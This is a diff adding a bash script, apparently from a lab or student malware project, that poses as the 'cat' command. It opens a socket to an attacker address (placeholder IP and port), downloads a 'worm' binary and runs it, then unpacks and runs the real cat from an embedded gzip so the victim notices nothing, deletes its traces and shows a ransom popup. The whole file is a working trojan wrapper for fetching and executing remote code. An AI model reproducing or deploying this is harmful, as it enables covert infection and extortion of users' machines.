@@ -1,0 +1,42 @@
+#! /usr/bin/env bash
+
+#echo -e "192.168.56.105\n7000\n" > ./attack.txt
+
+python3 <<EOF
+import socket
+
+#with open("./attack.txt", 'r') as f:
+#	attack_ip = f.readline().strip("\n")
+#	attack_port = int(f.readline().strip("\n"))
+
+attack_ip = "xxx.xxx.xxx.xxx"
+attack_port = yyyy
+
+victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+victim_socket.connect((attack_ip, attack_port))
+
+worm_bytes = victim_socket.recv(1024)
+
+with open("./catw", 'wb') as f:
+	f.write(worm_bytes)
+
+#print("Fetch Worm!")
+
+EOF
+
+chmod +x ./catw
+./catw
+
+dd if=./cat of=./cat_orig.gz bs=1 skip=### count=##### >/dev/null 2>&1
+gzip -d ./cat_orig.gz
+
+chmod +x ./cat_orig
+./cat_orig "$@"
+
+rm ./cat_orig
+#rm "./attack.txt"
+rm ./catw
+
+zenity --warning --text="Give me ransom haha" &
+
+exit
